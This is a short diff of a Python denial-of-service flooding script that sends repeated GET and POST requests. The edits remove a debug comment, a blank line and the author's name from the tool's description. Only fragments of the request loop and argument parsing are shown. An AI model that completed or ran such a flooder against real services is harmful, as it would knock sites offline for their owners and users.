@@ -76,7 +76,6 @@ def sendGET(url):
 	try:
 		request_counter+=1
 		request = requests.get(url, headers=headers)
-		# print 'her'
 		handleStatusCodes(request.status_code)
 	except:
 		pass
@@ -112,9 +111,8 @@ class SendPOSTThread(threading.Thread):
 		except:
 			pass
 
-
 def main(argv):
-	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
+	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks.')
 	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
 	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
 	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
